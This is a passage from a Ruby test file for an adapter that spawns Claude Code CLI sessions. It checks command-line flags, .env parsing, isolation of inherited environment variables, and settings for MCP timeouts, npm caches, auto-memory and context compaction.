      mcp_config_path: "/etc/claude/mcp.json",
      dangerously_skip_permissions: true,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    # "--" signals end of options so prompts starting with dashes work correctly
    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--mcp-config",
      "/etc/claude/mcp.json",
      "--session-id",
      "session-xyz-123",
      "--",
      "complex task with 'quotes' and special chars $@"
    ]

    assert_equal expected, spawned_command
  end

  test "resume with all options creates correct command" do
    @adapter.resume(
      session_id: "resume-xyz-456",
      prompt: "resume with 'quotes' and special chars $@",
      working_dir: @test_dir,
      dangerously_skip_permissions: true,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    # "--" signals end of options so prompts starting with dashes work correctly
    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--resume",
      "resume-xyz-456",
      "--",
      "resume with 'quotes' and special chars $@"
    ]

    assert_equal expected, spawned_command
  end

  test "resume without prompt creates command for retry scenario" do
    result = @adapter.resume(
      session_id: "retry-session-123",
      working_dir: @test_dir,
      dangerously_skip_permissions: true,
      debug: true
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    expected = [
      "claude",
      "--dangerously-skip-permissions",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--debug",
      "--resume",
      "retry-session-123"
    ]

    assert_equal expected, spawned_command
    assert result[:pid] >= 10000
    assert_equal File.join(@test_dir, "claude_stderr.log"), result[:stderr_log_path]
  end

  test "resume with nil prompt excludes prompt from command" do
    @adapter.resume(
      session_id: "retry-nil-prompt",
      prompt: nil,
      working_dir: @test_dir,
      dangerously_skip_permissions: false,
      debug: false
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    expected = [
      "claude",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--resume",
      "retry-nil-prompt"
    ]

    assert_equal expected, spawned_command
  end

  test "resume with empty string prompt excludes prompt from command" do
    @adapter.resume(
      session_id: "retry-empty-prompt",
      prompt: "",
      working_dir: @test_dir,
      dangerously_skip_permissions: false,
      debug: false
    )

    spawned = @mock_process_manager.spawned_processes.first
    spawned_command = spawned[:command]

    expected = [
      "claude",
      "--disallowedTools", "Monitor", "ScheduleWakeup", "Bash(sleep *)", "Skill(schedule)", "AskUserQuestion",
      "--resume",
      "retry-empty-prompt"
    ]

    assert_equal expected, spawned_command
  end

  # ===== ENV FILE LOADING TESTS =====

  test "load_env_file returns empty hash when .env file doesn't exist" do
    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal({}, result)
  end

  test "load_env_file parses basic KEY=VALUE format" do
    env_content = <<~ENV
      API_KEY=secret123
      DATABASE_URL=postgres://localhost/db
      PORT=3000
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal "secret123", result["API_KEY"]
    assert_equal "postgres://localhost/db", result["DATABASE_URL"]
    assert_equal "3000", result["PORT"]
  end

  test "load_env_file handles quoted values" do
    env_content = <<~ENV
      QUOTED_DOUBLE="value with spaces"
      QUOTED_SINGLE='another value'
      UNQUOTED=no_spaces
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal "value with spaces", result["QUOTED_DOUBLE"]
    assert_equal "another value", result["QUOTED_SINGLE"]
    assert_equal "no_spaces", result["UNQUOTED"]
  end

  test "load_env_file skips empty lines and comments" do
    env_content = <<~ENV
      # This is a comment
      API_KEY=secret

      # Another comment
      DATABASE_URL=postgres://db
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal 2, result.size
    assert_equal "secret", result["API_KEY"]
    assert_equal "postgres://db", result["DATABASE_URL"]
  end

  test "load_env_file handles values with equals signs" do
    env_content = "CONNECTION_STRING=Server=localhost;Database=test"

    File.write(File.join(@test_dir, ".env"), env_content)

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal "Server=localhost;Database=test", result["CONNECTION_STRING"]
  end

  test "load_env_file handles empty values" do
    env_content = <<~ENV
      EMPTY_VALUE=
      ANOTHER_KEY=value
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal "", result["EMPTY_VALUE"]
    assert_equal "value", result["ANOTHER_KEY"]
  end

  test "load_env_file ignores invalid lines" do
    env_content = <<~ENV
      VALID_KEY=value
      invalid line without equals
      ANOTHER_VALID=123
      =no_key
      123STARTS_WITH_NUMBER=invalid
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal 2, result.size
    assert_equal "value", result["VALID_KEY"]
    assert_equal "123", result["ANOTHER_VALID"]
  end

  test "load_env_file returns empty hash on read error" do
    # Don't create the file, but mock file_system to raise an error
    mock_file_system = Minitest::Mock.new
    mock_file_system.expect(:exists?, true, [ String ])
    mock_file_system.expect(:read, ->(_) { raise "Read error" }, [ String ])

    @adapter.file_system = mock_file_system

    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal({}, result)
  end

  test "load_env_file rejects files larger than 1MB" do
    # Create a large .env file (just over 1MB)
    # Each line is ~10 bytes, so 110,000 lines = ~1.1MB
    large_content = "KEY=value\n" * 110000
    File.write(File.join(@test_dir, ".env"), large_content)

    # Verify file is actually over 1MB
    file_size = File.size(File.join(@test_dir, ".env"))
    assert file_size > 1.megabyte, "Test file should be over 1MB (was #{file_size} bytes)"

    result = @adapter.send(:load_env_file, @test_dir)

    # Should return empty hash and not parse the large file
    assert_equal({}, result)
  end

  test "load_env_file handles mismatched quotes gracefully" do
    env_content = <<~ENV
      MISMATCHED1="value'
      MISMATCHED2='value"
      VALID="correct"
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)
    result = @adapter.send(:load_env_file, @test_dir)

    # Mismatched quotes are preserved as-is (not stripped)
    assert_equal "\"value'", result["MISMATCHED1"]
    assert_equal "'value\"", result["MISMATCHED2"]
    assert_equal "correct", result["VALID"]
  end

  test "load_env_file handles single character quoted values" do
    env_content = <<~ENV
      SINGLE_CHAR_DOUBLE="x"
      SINGLE_CHAR_SINGLE='y'
      JUST_QUOTES=""
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)
    result = @adapter.send(:load_env_file, @test_dir)

    assert_equal "x", result["SINGLE_CHAR_DOUBLE"]
    assert_equal "y", result["SINGLE_CHAR_SINGLE"]
    assert_equal "", result["JUST_QUOTES"]
  end

  test "spawn_process passes environment variables from .env to spawned process" do
    env_content = <<~ENV
      API_KEY=test_key_123
      DEBUG_MODE=true
    ENV

    File.write(File.join(@test_dir, ".env"), env_content)

    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "test_key_123", env_vars["API_KEY"]
    assert_equal "true", env_vars["DEBUG_MODE"]
  end

  test "spawn_process works without .env file" do
    command = [ "claude", "test" ]

    result = @adapter.send(:spawn_process, command, working_dir: @test_dir)

    assert result[:pid] >= 10000
    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    # Even without .env file, database env vars should be set to nil for isolation
    assert_nil env_vars["DATABASE_URL"]
    assert_nil env_vars["RAILS_ENV"]

    # Only ENABLE_TOOL_SEARCH, CLAUDE_CODE_DISABLE_CRON, CLAUDE_CODE_DISABLE_AUTO_MEMORY, and CLAUDE_CODE_AUTO_COMPACT_WINDOW should be set (plus nil values for database vars)
    non_nil_vars = env_vars.reject { |_k, v| v.nil? }
    assert_equal({ "ENABLE_TOOL_SEARCH" => "false", "CLAUDE_CODE_DISABLE_CRON" => "1", "CLAUDE_CODE_DISABLE_AUTO_MEMORY" => "1", "CLAUDE_CODE_AUTO_COMPACT_WINDOW" => "200000" }, non_nil_vars)
  end

  test "execute loads .env file from working directory" do
    env_content = "ANTHROPIC_API_KEY=test_api_key"
    File.write(File.join(@test_dir, ".env"), env_content)

    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "test_api_key", env_vars["ANTHROPIC_API_KEY"]
  end

  test "resume loads .env file from working directory" do
    env_content = "ANTHROPIC_API_KEY=resume_api_key"
    File.write(File.join(@test_dir, ".env"), env_content)

    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "resume_api_key", env_vars["ANTHROPIC_API_KEY"]
  end

  # ===== INHERITED ENVIRONMENT VARIABLE ISOLATION TESTS =====
  # These tests verify that spawned processes don't inherit configuration
  # from the parent Rails process that could interfere with execution:
  # - Database config: prevents tests from polluting the dev database (issue #500)
  # - Bundler config: prevents gem path conflicts in cloned repos (issue #569)

  test "clear_inherited_env_vars sets database env vars to nil when not in .env" do
    env_vars = { "API_KEY" => "secret" }

    result = @adapter.send(:clear_inherited_env_vars, env_vars)

    # Database vars should be set to nil (unset in child process)
    assert_nil result["DATABASE_URL"]
    assert_nil result["DATABASE_HOST"]
    assert_nil result["DATABASE_PORT"]
    assert_nil result["DATABASE_NAME"]
    assert_nil result["DATABASE_USERNAME"]
    assert_nil result["DATABASE_PASSWORD"]
    assert_nil result["DATABASE_ADAPTER"]
    assert_nil result["RAILS_ENV"]

    # Non-inherited vars should be preserved
    assert_equal "secret", result["API_KEY"]
  end

  test "clear_inherited_env_vars sets bundler env vars to nil when not in .env" do
    env_vars = { "API_KEY" => "secret" }

    result = @adapter.send(:clear_inherited_env_vars, env_vars)

    # Bundler vars should be set to nil (unset in child process)
    assert_nil result["BUNDLE_PATH"]
    assert_nil result["BUNDLE_GEMFILE"]
    assert_nil result["BUNDLE_BIN_PATH"]
    assert_nil result["BUNDLE_APP_CONFIG"]
    assert_nil result["BUNDLE_DEPLOYMENT"]
    assert_nil result["BUNDLE_FROZEN"]
    assert_nil result["BUNDLE_WITHOUT"]
    assert_nil result["BUNDLE_WITH"]
    # BUNDLER_SETUP is the var a Bundler-patched rubygems auto-requires at
    # interpreter startup; an inherited value crashes a spawned Ruby child
    # (e.g. the PTY agent driver) against the cwd's Gemfile.lock before its own
    # code runs. It must be cleared like the other bundler vars. Assert the key
    # is present-and-nil (not merely absent) so this fails if the allowlist entry
    # is reverted — an absent key would also read as nil and hide the regression.
    assert result.key?("BUNDLER_SETUP"), "BUNDLER_SETUP must be present-and-nil to unset it in the child"
    assert_nil result["BUNDLER_SETUP"]
    assert_nil result["BUNDLER_VERSION"]
    assert_nil result["GEM_HOME"]
    assert_nil result["GEM_PATH"]
    assert_nil result["RUBYLIB"]
    assert_nil result["RUBYOPT"]
    assert_nil result["RUBYGEMS_GEMDEPS"]

    # Non-inherited vars should be preserved
    assert_equal "secret", result["API_KEY"]
  end

  test "clear_inherited_env_vars strips inherited BUNDLER_SETUP family from parent ENV" do
    # Regression for the spawn-failure root cause: modern Bundler exports
    # BUNDLER_SETUP (a RubyGems auto-require hook), BUNDLER_VERSION, and
    # BUNDLER_ORIG_* preserved originals from `bundle exec`. AO's worker runs
    # under `bundle exec good_job`, so these are present in the worker's ENV. If
    # they leak into a spawned agent, the Ruby PTY driver — which chdir's into
    # the project clone — auto-loads bundler/setup against the clone's Gemfile
    # and dies with Bundler::GemNotFound before the agent CLI ever launches when
    # the clone's `bundle install` hasn't finished or has failed. The fix sweeps
    # every inherited BUNDLE*/BUNDLER* key to nil so it's unset in the child.
    original = ENV.to_h.slice("BUNDLER_SETUP", "BUNDLER_VERSION", "BUNDLER_ORIG_PATH", "BUNDLER_ORIG_GEM_HOME")
    ENV["BUNDLER_SETUP"] = "/usr/local/lib/ruby/3.4.0/bundler/setup"
    ENV["BUNDLER_VERSION"] = "2.7.2"
    ENV["BUNDLER_ORIG_PATH"] = "/usr/local/bin:/usr/bin"
    ENV["BUNDLER_ORIG_GEM_HOME"] = "/usr/local/bundle"

    result = @adapter.send(:clear_inherited_env_vars, {})

    # The explicit-list members are present-as-nil...
    assert result.key?("BUNDLER_SETUP"), "BUNDLER_SETUP should be present so Process.spawn unsets it"
    assert_nil result["BUNDLER_SETUP"]
    assert_nil result["BUNDLER_VERSION"]
    # ...and the prefix sweep catches the BUNDLER_ORIG_* family we don't name.
    assert result.key?("BUNDLER_ORIG_PATH"), "BUNDLER_ORIG_PATH should be swept from parent ENV"
    assert_nil result["BUNDLER_ORIG_PATH"]
    assert_nil result["BUNDLER_ORIG_GEM_HOME"]
  ensure
    %w[BUNDLER_SETUP BUNDLER_VERSION BUNDLER_ORIG_PATH BUNDLER_ORIG_GEM_HOME].each { |k| ENV.delete(k) }
    original.each { |k, v| ENV[k] = v }
  end

  test "clear_inherited_env_vars lets explicit .env value win over BUNDLER ENV sweep" do
    # A clone that legitimately needs a Bundler var in its .env must keep it even
    # though the same key is present in the parent ENV and would otherwise be
    # swept to nil.
    original = ENV.to_h.slice("BUNDLER_VERSION")
    ENV["BUNDLER_VERSION"] = "2.7.2"

    result = @adapter.send(:clear_inherited_env_vars, { "BUNDLER_VERSION" => "2.6.9" })

    assert_equal "2.6.9", result["BUNDLER_VERSION"]
  ensure
    ENV.delete("BUNDLER_VERSION")
    original.each { |k, v| ENV[k] = v }
  end

  test "clear_inherited_env_vars preserves database env vars from .env file" do
    # Simulate .env file containing explicit database config (e.g., for testing)
    env_vars = {
      "DATABASE_URL" => "postgres://test:5432/myapp_test",
      "DATABASE_HOST" => "test-db.example.com",
      "RAILS_ENV" => "test"
    }

    result = @adapter.send(:clear_inherited_env_vars, env_vars)

    # Values from .env should be preserved
    assert_equal "postgres://test:5432/myapp_test", result["DATABASE_URL"]
    assert_equal "test-db.example.com", result["DATABASE_HOST"]
    assert_equal "test", result["RAILS_ENV"]

    # Other database vars should still be unset
    assert_nil result["DATABASE_PORT"]
    assert_nil result["DATABASE_NAME"]
  end

  test "clear_inherited_env_vars preserves bundler env vars from .env file" do
    # Simulate .env file containing explicit bundler config
    env_vars = {
      "BUNDLE_PATH" => "/custom/bundle/path",
      "GEM_HOME" => "/custom/gem/home"
    }

    result = @adapter.send(:clear_inherited_env_vars, env_vars)

    # Values from .env should be preserved
    assert_equal "/custom/bundle/path", result["BUNDLE_PATH"]
    assert_equal "/custom/gem/home", result["GEM_HOME"]

    # Other bundler vars should still be unset
    assert_nil result["BUNDLE_GEMFILE"]
    assert_nil result["GEM_PATH"]
  end

  test "spawn_process clears inherited env vars to ensure isolation" do
    # Create a .env file with a non-inherited variable
    env_content = "API_KEY=test_key"
    File.write(File.join(@test_dir, ".env"), env_content)

    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    # Database env vars should be set to nil (will be unset in child process)
    assert_nil env_vars["DATABASE_URL"]
    assert_nil env_vars["DATABASE_HOST"]
    assert_nil env_vars["RAILS_ENV"]

    # Bundler env vars should be set to nil (will be unset in child process)
    assert_nil env_vars["BUNDLE_PATH"]
    assert_nil env_vars["BUNDLE_GEMFILE"]
    assert_nil env_vars["GEM_HOME"]
    assert_nil env_vars["GEM_PATH"]
    assert_nil env_vars["RUBYOPT"]

    # Non-inherited vars from .env should be preserved
    assert_equal "test_key", env_vars["API_KEY"]
  end

  test "spawn_process preserves explicit config from .env file" do
    # Simulate a .env file with explicit test database and bundler config
    env_content = <<~ENV
      DATABASE_URL=postgres://localhost/myapp_test
      RAILS_ENV=test
      BUNDLE_PATH=/project/vendor/bundle
      API_KEY=secret
    ENV
    File.write(File.join(@test_dir, ".env"), env_content)

    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    # Explicit values from .env should be preserved
    assert_equal "postgres://localhost/myapp_test", env_vars["DATABASE_URL"]
    assert_equal "test", env_vars["RAILS_ENV"]
    assert_equal "/project/vendor/bundle", env_vars["BUNDLE_PATH"]
    assert_equal "secret", env_vars["API_KEY"]
  end

  # ===== MCP_TIMEOUT TESTS =====
  # When MCP servers are configured, set a longer timeout for package installation

  test "MCP_TIMEOUT_MS constant is set to 3 minutes" do
    assert_equal 180_000, ClaudeCliAdapter::MCP_TIMEOUT_MS
  end

  test "spawn_process sets MCP_TIMEOUT when has_mcp is true" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir, has_mcp: true)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "180000", env_vars["MCP_TIMEOUT"]
  end

  test "spawn_process does not set MCP_TIMEOUT when has_mcp is false" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir, has_mcp: false)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("MCP_TIMEOUT"), "MCP_TIMEOUT should not be set when has_mcp is false"
  end

  test "spawn_process does not set MCP_TIMEOUT by default" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("MCP_TIMEOUT"), "MCP_TIMEOUT should not be set by default"
  end

  test "execute passes has_mcp true when mcp_config_path is provided" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json"
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "180000", env_vars["MCP_TIMEOUT"]
  end

  test "execute does not set MCP_TIMEOUT when mcp_config_path is nil" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      mcp_config_path: nil
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("MCP_TIMEOUT")
  end

  test "spawn_process_with_stdin sets MCP_TIMEOUT when has_mcp is true" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content, has_mcp: true)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "180000", env_vars["MCP_TIMEOUT"]
  end

  test "spawn_process_with_stdin does not set MCP_TIMEOUT when has_mcp is false" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content, has_mcp: false)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("MCP_TIMEOUT")
  end

  test "resume passes --mcp-config flag in command when mcp_config_path is provided" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json"
    )

    spawned = @mock_process_manager.spawned_processes.first
    command = spawned[:command]
    mcp_index = command.index("--mcp-config")
    assert mcp_index, "--mcp-config flag should be present in resume command"
    assert_equal "/path/to/mcp.json", command[mcp_index + 1]
  end

  test "resume sets MCP_TIMEOUT when mcp_config_path is provided" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json"
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "180000", env_vars["MCP_TIMEOUT"]
  end

  test "resume does not set MCP_TIMEOUT when mcp_config_path is nil" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir,
      mcp_config_path: nil
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("MCP_TIMEOUT")
  end

  # ===== NPM_CONFIG_CACHE ISOLATION TESTS =====
  # When MCP servers are configured, isolate npm cache per session to prevent
  # concurrent npx invocations from corrupting the shared ~/.npm/ cache

  test "spawn_process sets NPM_CONFIG_CACHE to per-session directory when has_mcp is true" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir, has_mcp: true)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    expected_cache_dir = File.join(@test_dir, ".npm-cache")
    assert_equal expected_cache_dir, env_vars["NPM_CONFIG_CACHE"]
  end

  test "spawn_process creates the npm cache directory when has_mcp is true" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir, has_mcp: true)

    npm_cache_dir = File.join(@test_dir, ".npm-cache")
    assert Dir.exist?(npm_cache_dir), "npm cache directory should be created"
  end

  test "spawn_process does not set NPM_CONFIG_CACHE when has_mcp is false" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir, has_mcp: false)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("NPM_CONFIG_CACHE"), "NPM_CONFIG_CACHE should not be set when has_mcp is false"
  end

  test "spawn_process does not set NPM_CONFIG_CACHE by default" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("NPM_CONFIG_CACHE"), "NPM_CONFIG_CACHE should not be set by default"
  end

  test "spawn_process_with_stdin creates the npm cache directory when has_mcp is true" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content, has_mcp: true)

    npm_cache_dir = File.join(@test_dir, ".npm-cache")
    assert Dir.exist?(npm_cache_dir), "npm cache directory should be created"
  end

  test "spawn_process_with_stdin sets NPM_CONFIG_CACHE when has_mcp is true" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content, has_mcp: true)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    expected_cache_dir = File.join(@test_dir, ".npm-cache")
    assert_equal expected_cache_dir, env_vars["NPM_CONFIG_CACHE"]
  end

  test "spawn_process_with_stdin does not set NPM_CONFIG_CACHE when has_mcp is false" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content, has_mcp: false)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("NPM_CONFIG_CACHE"), "NPM_CONFIG_CACHE should not be set when has_mcp is false"
  end

  test "execute sets NPM_CONFIG_CACHE when mcp_config_path is provided" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json"
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    expected_cache_dir = File.join(@test_dir, ".npm-cache")
    assert_equal expected_cache_dir, env_vars["NPM_CONFIG_CACHE"]
  end

  test "execute does not set NPM_CONFIG_CACHE when mcp_config_path is nil" do
    @adapter.execute(
      prompt: "test",
      session_id: "session-1",
      working_dir: @test_dir,
      mcp_config_path: nil
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("NPM_CONFIG_CACHE")
  end

  test "resume sets NPM_CONFIG_CACHE when mcp_config_path is provided" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir,
      mcp_config_path: "/path/to/mcp.json"
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    expected_cache_dir = File.join(@test_dir, ".npm-cache")
    assert_equal expected_cache_dir, env_vars["NPM_CONFIG_CACHE"]
  end

  test "resume does not set NPM_CONFIG_CACHE when mcp_config_path is nil" do
    @adapter.resume(
      session_id: "session-1",
      prompt: "continue",
      working_dir: @test_dir,
      mcp_config_path: nil
    )

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    refute env_vars.key?("NPM_CONFIG_CACHE")
  end

  # ===== ENABLE_TOOL_SEARCH / extension spawn-env seam =====
  # AO's baseline sets ENABLE_TOOL_SEARCH=false; the mcp_tool_search extension
  # flips it on by contributing the var through the spawn-env seam. The baseline
  # (false-by-default) is a core adapter behavior and holds even with every
  # extension deleted. The "extension flips it on" case is exercised with a FAKE
  # contributing extension so it tests the adapter's seam, not the deletable
  # mcp_tool_search — whose own ENABLE_TOOL_SEARCH=true contribution is covered in
  # test/extensions/mcp_tool_search/.
  class FakeEnvContribExtension < Ao::Extension
    def id = "fake_env_contrib"
    def spawn_env_contribution(context = {}) = (context[:runtime].to_s == "claude_code") ? { "ENABLE_TOOL_SEARCH" => "true" } : {}
  end

  test "spawn_process sets ENABLE_TOOL_SEARCH to false by default" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "false", env_vars["ENABLE_TOOL_SEARCH"]
  end

  test "spawn_process_with_stdin sets ENABLE_TOOL_SEARCH to false by default" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "false", env_vars["ENABLE_TOOL_SEARCH"]
  end

  test "spawn_process merges an enabled extension's spawn-env contribution over the baseline" do
    AppSetting.delete_all
    Ao::ExtensionRegistry.register(FakeEnvContribExtension.new)
    AppSetting.editable.tap { |s| s.set_extension_enabled("fake_env_contrib", true); s.save! }

    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "true", env_vars["ENABLE_TOOL_SEARCH"]
  ensure
    AppSetting.delete_all
    Ao::ExtensionRegistry.reset!
    Ao::ExtensionRegistry.register_builtins!
  end

  # ===== CLAUDE_CODE_DISABLE_AUTO_MEMORY TESTS =====
  # Disable Claude Code's auto-memory feature for all AO-spawned sessions.
  # AO sessions are session-scoped — durable persistence belongs in code/CLAUDE.md/PRs,
  # not in ~/.claude/projects/<slug>/memory/. The env var is the hard layer that
  # prevents memory writes regardless of agent intent.

  test "spawn_process sets CLAUDE_CODE_DISABLE_AUTO_MEMORY to 1" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "1", env_vars["CLAUDE_CODE_DISABLE_AUTO_MEMORY"]
  end

  test "spawn_process_with_stdin sets CLAUDE_CODE_DISABLE_AUTO_MEMORY to 1" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "1", env_vars["CLAUDE_CODE_DISABLE_AUTO_MEMORY"]
  end

  # ===== CLAUDE_CODE_AUTO_COMPACT_WINDOW TESTS =====
  # Set auto-compact window to reduce context-length errors

  test "spawn_process sets CLAUDE_CODE_AUTO_COMPACT_WINDOW to 200000" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "200000", env_vars["CLAUDE_CODE_AUTO_COMPACT_WINDOW"]
  end

  test "spawn_process_with_stdin sets CLAUDE_CODE_AUTO_COMPACT_WINDOW to 200000" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "200000", env_vars["CLAUDE_CODE_AUTO_COMPACT_WINDOW"]
  end

  test "spawn_process honors auto_compact_window override" do
    command = [ "claude", "test" ]
    @adapter.send(:spawn_process, command, working_dir: @test_dir, auto_compact_window: 50_000)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "50000", env_vars["CLAUDE_CODE_AUTO_COMPACT_WINDOW"]
  end

  test "spawn_process_with_stdin honors auto_compact_window override" do
    command = [ "claude", "-p", "--input-format", "stream-json" ]
    stdin_content = '{"type":"user","message":{}}'
    @adapter.send(:spawn_process_with_stdin, command, working_dir: @test_dir, stdin_content: stdin_content, auto_compact_window: 75_000)

    spawned = @mock_process_manager.spawned_processes.first
    env_vars = spawned[:env]

    assert_equal "75000", env_vars["CLAUDE_CODE_AUTO_COMPACT_WINDOW"]
  end

  # ===== STDIN PIPE DELIVERY TESTS =====
  # Claude CLI's --input-format stream-json reader only consumes stdin when it is
  # a pipe (non-seekable). A regular file is silently ignored (reads nothing,
  # exits 0), which dropped image/large-prompt follow-ups. These tests guard the
